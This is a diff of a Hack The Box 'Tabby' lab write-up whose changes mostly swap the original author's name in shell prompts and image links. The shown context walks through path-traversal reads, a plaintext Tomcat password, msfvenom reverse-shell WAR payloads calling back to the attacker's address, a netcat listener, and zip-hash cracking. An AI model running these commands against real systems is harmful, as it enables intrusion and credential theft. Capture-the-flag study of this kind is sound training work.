@@ -9,6 +9,7 @@ avatar: assets/htb/tabby.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Tabby
 ---
+
 ## Overview
 
 TODO: Finish writeup and clean up
@@ -20,9 +21,9 @@ TODO: Finish writeup and clean up
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ sudo nmap -sSCV -p- -n -v -oA tabby <YOUR_IP>
-[sudo] password for zweilos: 
+[sudo] password for kac0: 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 13:08 EDT
 NSE: Loaded 151 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -86,43 +87,43 @@ Nmap done: 1 IP address (1 host up) scanned in 86.69 seconds
 
 added megahosting.htb to hosts file
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-tabby-hosting.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-tabby-hosting.png)
 
 > We have recently upgraded several services. Our servers are now more secure than ever. Read our statement on recovering from the data breach
 
 [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-breach-news.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-breach-news.png)
 
 recently had a breach of some sort [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) replaced 'statement' with ../../../../etc/passwd and got the file
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-etcpasswd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-etcpasswd.png)
 
 found username `ash`
 
 Next decided to check out the HTTP site hosted on port 8080
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-8080-manager.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-8080-manager.png)
 
 When I navigated to port 8080 I was greeted by a basic authentication prompt that said "Tomcat Manager Application".  This sounded promising, but I needed to find some credentials first.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-8080-manager-unauth.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-8080-manager-unauth.png)
 
 Putting in bad credentials redirected me to a very verbose 401 Unauthorized page.  [http://<YOUR_IP>:8080/docs/host-manager-howto.html](http://<YOUR_IP>:8080/docs/host-manager-howto.html)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-tomcat-users%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-tomcat-users%2520%25281%2529.png)
 
 `<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"> </user>`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-complete-server-status%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-complete-server-status%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-server-information%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-server-information%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-tomcat-manager.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-tomcat-manager.png)
 
 how to use curl to send package to server
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-addhost.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-addhost.png)
 
 ```text
 Add command
@@ -150,7 +151,7 @@ add: Adding host [www.awesomeserver.com]
 [https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.216 LPORT=12543 -f war -o CRash.war
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -179,7 +180,7 @@ msf5 exploit(multi/handler) > run
 started my handler in msfconsole
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ curl -u 'tomcat:$3cureP4s5w0rd123!' "http://<YOUR_IP>:8080/host-manager/html/add?name=test&aliases=test&appBase=http://10.10.14.216:8099/CRash.war&deployOnStartup=true"
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
 <html>
@@ -209,7 +210,7 @@ upload did not work as in the Windows example, kept reading in the documentation
 
 [http://<YOUR_IP>:8080/docs/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_\(WAR\)\_Remotely](http://<YOUR_IP>:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-manager-deploy.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-manager-deploy.png)
 
 In order to send the file
 
@@ -226,7 +227,7 @@ In order to send the file
 I checked the man page for the correct options and found `-T`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ curl -u 'tomcat:$3cureP4s5w0rd123!' -T CRash.war http://megahosting.htb:8080/manager/text/deploy?path=/CRash   
 OK - Deployed application at context path [/CRash]
 ```
@@ -234,7 +235,7 @@ OK - Deployed application at context path [/CRash]
 after troubleshooting...I realized that my payload was set to be run in the context of a linux machine, however, this was being run as a java file \(after the .war was unpacked, running on the web server\) so I changed my payload and tried again
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.216 LPORT=12543 -f war -o CRash.war       1 ⨯
 Payload size: 1084 bytes
 Final size of war file: 1084 bytes
@@ -244,7 +245,7 @@ Saved as: CRash.war
 next I uploaded the new version \(had to change the name since the old one still existed\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ curl http://<YOUR_IP>:8080/CRash2/
 ```
 
@@ -255,7 +256,7 @@ Then I activated my reverse shell by curling the
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ nc -lvnp 12543
 listening on [any] 12543 ...
 connect to [10.10.14.216] from (UNKNOWN) [<YOUR_IP>] 53772
@@ -264,10 +265,10 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@tabby:/var/lib/tomcat9$ ^Z
 zsh: suspended  nc -lvnp 12543
 
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ stty raw -echo                                                                            148 ⨯ 1 ⚙
 
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
                                    └─$                                                                  fg                        
 [1]  + continued  nc -lvnp 12543
                                 ^[[1;5C
@@ -295,7 +296,7 @@ msf5 exploit(multi/handler) >
 whoami
 [*] exec: whoami
 
-zweilos
+kac0
 msf5 exploit(multi/handler) > sessions 2
 [*] Starting interaction with 2...
 
@@ -354,14 +355,14 @@ drwxr-x---  4 tomcat tomcat 4096 Oct 12 17:24 shell_m
 shsjks
 
 ```text
-zweilos@kali:~/htb/tabby$ nc -lvnp 12543
+kac0@kali:~/htb/tabby$ nc -lvnp 12543
 listening on [any] 12543 ...
 connect to [10.10.14.216] from (UNKNOWN) [<YOUR_IP>] 53782
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@tabby:/var/lib/tomcat9$ ^Z
 [1]+  Stopped                 nc -lvnp 12543
-zweilos@kali:~/htb/tabby$ stty raw -echo
-zweilos@kali:~/htb/tabby$ nc -lvnp 12543
+kac0@kali:~/htb/tabby$ stty raw -echo
+kac0@kali:~/htb/tabby$ nc -lvnp 12543
 
 tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm-256color
 tomcat@tabby:/var/lib/tomcat9$ clear
@@ -383,7 +384,7 @@ drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
 in the /var/www/html/files folder I found some backup files
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ unzip 16162020_backup.zip 
 Archive:  16162020_backup.zip
    creating: var/www/html/assets/
@@ -394,7 +395,7 @@ password incorrect--reenter:
 exfiltrated the backup zip to my machine and tried to open it, but it was password protected
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ zip2john 16162020_backup.zip > ziphash
 16162020_backup.zip/var/www/html/assets/ is not encrypted!
 ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
@@ -412,7 +413,7 @@ option -o to pick a file at a time.
 I tried using zip2john to extract the zip hash for cracking, and got a message that some of the files might not be encrypted\
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ hashcat --help | grep -i pkzip                                     
   17200 | PKZIP (Compressed)                               | Archives
   17220 | PKZIP (Compressed Multi-File)                    | Archives
@@ -426,7 +427,7 @@ I tried using zip2john to extract the zip hash for cracking, and got a message t
 checked hashcat's help to see which filetype to use
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ hashcat -O -D1,2 -a0 -m17225 --username ziphash /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 
@@ -475,7 +476,7 @@ Stopped: Mon Oct 12 15:51:16 2020
 it took only a few secs to crack the password, which was `admin@it`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
+┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ unzip 16162020_backup.zip
 Archive:  16162020_backup.zip
 [16162020_backup.zip] var/www/html/favicon.ico password: 
@@ -487,9 +488,9 @@ Archive:  16162020_backup.zip
   inflating: var/www/html/Readme.txt
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-zip.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-zip.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-digitallandscape.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-digitallandscape.png)
 
 The `index.php` file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.
 
@@ -515,7 +516,7 @@ drwxr-xr-x 3 ash  ash     4096 Oct 12 19:56 snap
 -rw-r----- 1 ash  ash        0 May 19 11:48 .sudo_as_admin_successful
 -rw-r----- 1 ash  ash       33 Oct 12 19:54 user.txt
 ash@tabby:~$ cat user.txt 
-e33e****2efa
+e33e************************2efa
 ```
 
 The zip file seemed to be a dead-end, so I decided to try to use the password I had found on the only user I knew, `ash`, and was able to `su` over to that user!
@@ -640,5 +641,5 @@ ash: ssh: not found
 /mnt/root/root # ls
 root.txt  snap
 /mnt/root/root # cat root.txt 
-2d8c****7ab1
+2d8c************************7ab1
 ```
